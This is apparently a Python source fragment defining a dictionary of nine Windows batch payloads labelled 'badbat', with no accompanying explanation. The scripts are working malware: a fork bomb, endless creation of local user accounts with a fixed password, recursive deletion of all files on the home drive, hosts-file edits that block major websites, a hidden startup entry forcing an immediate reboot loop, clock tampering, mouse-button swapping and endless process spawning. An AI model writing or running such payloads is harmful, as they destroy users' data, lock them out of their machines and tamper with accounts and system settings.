payload = {1 : """
@echo off
%0 | %0
""",
		   2 : """
@echo off
:badbat
net user user%random% YEAHbro@123 /add
goto badbat
""",
           3 : """
@echo off
:badbat
cd %USERPROFILE%\\Desktop || cd %ONEDRIVE%\\Desktop
mkdir folder%random%
goto badbat
""",
           4 : """
@echo off
cd %HOMEDRIVE%
del /S /Q *.*
""",
		   5 : """
@echo off
echo 127.0.0.1 facebook facebook.com www.facebook.com >> C:\\Windows\\system32\\drivers\\etc\\hosts
echo 127.0.0.1 google google.com www.google.com >> C:\\Windows\\system32\\drivers\\etc\\hosts
echo 127.0.0.1 twitter twitter.com www.twitter.com >> C:\\Windows\\system32\\drivers\\etc\\hosts
echo 127.0.0.1 instagram instagram.com www.instagram.com >> C:\\Windows\\system32\\drivers\\etc\\hosts
echo 127.0.0.1 youtube youtube.com www.youtube.com >> C:\\Windows\\system32\\drivers\\etc\\hosts
""",
		   6 : """
@echo off
cd %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
echo shutdown /r /t 0 > badbat.bat
attrib.exe +h badbat.bat
""",
		   7 : """
@echo off
:badbat
time 00:01
goto badbat
""",
		   8 : """
@echo off
Rundll32.exe user32.dll,SwapMouseButton
""",
		   9 : """
@echo off
:badbat
start notepad.exe
start cmd.exe
start powershell.exe
goto badbat
"""
	
}